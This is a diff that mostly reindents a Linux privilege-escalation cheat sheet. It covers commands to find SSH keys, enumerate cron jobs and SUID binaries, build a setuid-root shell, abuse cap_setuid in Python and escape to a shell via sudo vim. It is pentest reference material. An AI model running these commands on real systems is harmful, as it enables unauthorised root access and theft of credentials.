@@ -132,8 +132,8 @@ Find sensitive files
 SSH Key
 Sensitive files
 
-find / -name authorized_keys 2> /dev/null
-find / -name id_rsa 2> /dev/null
+    find / -name authorized_keys 2> /dev/null
+    find / -name id_rsa 2> /dev/null
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 SSH Key Predictable PRNG (Authorized_Keys) Process
 This module describes how to attempt to use an obtained authorized_keys file on a host system.
@@ -186,29 +186,30 @@ Check inside the file, to find other paths with write permissions.
     /var/spool/cron
     /var/spool/cron/crontabs/root
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 crontab -l
-ls -alh /var/spool/cron;
-ls -al /etc/ | grep cron
-ls -al /etc/cron*
-cat /etc/cron*
-cat /etc/at.allow
-cat /etc/at.deny
-cat /etc/cron.allow
-cat /etc/cron.deny*
-You can use pspy to detect a CRON job.
+    ls -alh /var/spool/cron;
+    ls -al /etc/ | grep cron
+    ls -al /etc/cron*
+    cat /etc/cron*
+    cat /etc/at.allow
+    cat /etc/at.deny
+    cat /etc/cron.allow
+    cat /etc/cron.deny*
+    You can use pspy to detect a CRON job.
 
 
-# print both commands and file system events and scan procfs every 1000 ms (=1sec)
-./pspy64 -pf -i 1000 
+    # print both commands and file system events and scan procfs every 1000 ms (=1sec)
+    ./pspy64 -pf -i 1000 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Systemd timers
 
-systemctl list-timers --all
-NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
-Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
-Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
-Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
-3 timers listed.
+    systemctl list-timers --all
+        NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+    Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+    Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+    Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+    3 timers listed.
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 SUID
 SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is root, the uid will be changed to root even if it was executed from user bob. SUID bit is represented by an s.
@@ -220,9 +221,9 @@ SUID/Setuid stands for "set user ID upon execution", it is enabled by default in
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Find SUID binaries
 
-find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-find / -uid 0 -perm -4000 -type f 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
+    find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+    find / -uid 0 -perm -4000 -type f 2>/dev/null
+    find / -perm -u=s -type f 2>/dev/null
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Create a SUID binary
 Function	Description
@@ -230,72 +231,72 @@ setreuid()	sets real and effective user IDs of the calling process
 setuid()	sets the effective user ID of the calling process
 setgid()	sets the effective group ID of the calling process
 
-print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
-gcc -o /tmp/suid /tmp/suid.c  
-sudo chmod +x /tmp/suid # execute right
-sudo chmod +s /tmp/suid # setuid bit
+    print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+    gcc -o /tmp/suid /tmp/suid.c  
+    sudo chmod +x /tmp/suid # execute right
+    sudo chmod +s /tmp/suid # setuid bit
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Capabilities
 
-List capabilities of binaries
-╭─swissky@lab ~  
-╰─$ /usr/bin/getcap -r  /usr/bin
-/usr/bin/fping                = cap_net_raw+ep
-/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
-/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
-/usr/bin/rlogin               = cap_net_bind_service+ep
-/usr/bin/ping                 = cap_net_raw+ep
-/usr/bin/rsh                  = cap_net_bind_service+ep
-/usr/bin/rcp                  = cap_net_bind_service+ep
+    List capabilities of binaries
+    ╭─swissky@lab ~  
+    ╰─$ /usr/bin/getcap -r  /usr/bin
+    /usr/bin/fping                = cap_net_raw+ep
+    /usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
+    /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+    /usr/bin/rlogin               = cap_net_bind_service+ep
+    /usr/bin/ping                 = cap_net_raw+ep
+    /usr/bin/rsh                  = cap_net_bind_service+ep
+    /usr/bin/rcp                  = cap_net_bind_service+ep
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Edit capabilities
 
-/usr/bin/setcap -r /bin/ping            # remove
-/usr/bin/setcap cap_net_raw+p /bin/ping # add
-Interesting capabilities
-Having the capability =ep means the binary has all the capabilities.
+    /usr/bin/setcap -r /bin/ping            # remove
+    /usr/bin/setcap cap_net_raw+p /bin/ping # add
+    Interesting capabilities
+    Having the capability =ep means the binary has all the capabilities.
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-$ getcap openssl /usr/bin/openssl 
-openssl=ep
-Alternatively the following capabilities can be used in order to upgrade your current privileges.
+    $ getcap openssl /usr/bin/openssl 
+    openssl=ep
+    Alternatively the following capabilities can be used in order to upgrade your current privileges.
 
 
-cap_dac_read_search # read anything
-cap_setuid+ep # setuid
+    cap_dac_read_search # read anything
+    cap_setuid+ep # setuid
 
-Example of privilege escalation with cap_setuid+ep
-$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+    Example of privilege escalation with cap_setuid+ep
+    $ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
 
-$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-sh-5.0# id
-uid=0(root) gid=1000(swissky)
-Capabilities name	Description
-CAP_AUDIT_CONTROL	Allow to enable/disable kernel auditing
-CAP_AUDIT_WRITE	Helps to write records to kernel auditing log
-CAP_BLOCK_SUSPEND	This feature can block system suspends
-CAP_CHOWN	Allow user to make arbitrary change to files UIDs and GIDs
-CAP_DAC_OVERRIDE	This helps to bypass file read, write and execute permission checks
-CAP_DAC_READ_SEARCH	This only bypasses file and directory read/execute permission checks
-CAP_FOWNER	This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file
-CAP_KILL	Allow the sending of signals to processes belonging to others
-CAP_SETGID	Allow changing of the GID
-CAP_SETUID	Allow changing of the UID
-CAP_SETPCAP	Helps to transferring and removal of current set to any PID
-CAP_IPC_LOCK	This helps to lock memory
-CAP_MAC_ADMIN	Allow MAC configuration or state changes
-CAP_NET_RAW	Use RAW and PACKET sockets
-CAP_NET_BIND_SERVICE	SERVICE Bind a socket to internet domain privileged ports
-SUDO
-Tool: Sudo Exploitation
+    $ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+    sh-5.0# id
+    uid=0(root) gid=1000(swissky)
+    Capabilities name	Description
+    CAP_AUDIT_CONTROL	Allow to enable/disable kernel auditing
+    CAP_AUDIT_WRITE	Helps to write records to kernel auditing log
+    CAP_BLOCK_SUSPEND	This feature can block system suspends
+    CAP_CHOWN	Allow user to make arbitrary change to files UIDs and GIDs
+    CAP_DAC_OVERRIDE	This helps to bypass file read, write and execute permission checks
+    CAP_DAC_READ_SEARCH	This only bypasses file and directory read/execute permission checks
+    CAP_FOWNER	This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file
+    CAP_KILL	Allow the sending of signals to processes belonging to others
+    CAP_SETGID	Allow changing of the GID
+    CAP_SETUID	Allow changing of the UID
+    CAP_SETPCAP	Helps to transferring and removal of current set to any PID
+    CAP_IPC_LOCK	This helps to lock memory
+    CAP_MAC_ADMIN	Allow MAC configuration or state changes
+    CAP_NET_RAW	Use RAW and PACKET sockets
+    CAP_NET_BIND_SERVICE	SERVICE Bind a socket to internet domain privileged ports
+    SUDO
+    Tool: Sudo Exploitation
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 NOPASSWD
 
-Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
-$ sudo -l
-User demo may run the following commands on crashlab:
+    Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
+    $ sudo -l
+    User demo may run the following commands on crashlab:
     (root) NOPASSWD: /usr/bin/vim
-In this example the user demo can run vim as root, it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh.
+    In this example the user demo can run vim as root, it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh.
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 sudo vim -c '!sh'
